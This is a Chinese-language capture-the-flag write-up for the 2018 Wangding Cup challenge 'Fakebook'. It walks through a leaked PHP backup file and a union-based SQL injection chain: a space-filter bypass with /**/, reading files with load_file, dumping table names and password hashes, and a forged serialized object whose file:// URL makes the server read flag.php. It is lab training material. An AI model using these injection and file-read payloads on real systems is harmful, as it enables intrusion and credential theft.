# [网鼎杯 2018]Fakebook

## 知识点

`sql注入`

`php代码审计`

`robots.txt`

## 解题

`robots.txt`里有`/user.php.bak`

下载后内容为

```php
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

```
?no=1%20order%20by%205 // 回显错误
?no=1%20order%20by%204 // 正常回显
```

因为过滤了空格，使用`/**/`绕过

`/view.php?no=-1%20union/**/select%201,2,3,4`

发现`2`回显，使用`load_file`读取文件

`/view.php?no=-1%20union/**/select%201,load_file('/var/www/html/flag.php'),3,4`

可以直接读取到`flag`，然后查看源码即可读取到`flag`

也可以继续注入

```
/view.php?no=-1%20union/**/select%201,database(),3,4
return: fakeroot

/view.php?no=-1%20union/**/select%201,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()
return: users

/view.php?no=-1%20union/**/select%201,group_concat(column_name),3,4 from information_schema.columns where table_name="users"
return: no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS 

/view.php?no=-1%20union/**/select%201,group_concat(username,passwd),3,4 from users
return: adminc7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ecO:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:123;s:4:"blog";s:7:"123.php";} 
```

发现`data`字段为`UserInfo`序列化后的数据

在这里我们是不是可以利用一下呢？于是我们对这个序列化后的内容稍作改动

```
O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";}
```

然后构造payload:

```
?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```

然后我们查看源码，发现读出来的数据，`base64`解密获得`flag`

[参考](https://www.cnblogs.com/junlebao/p/14104036.html)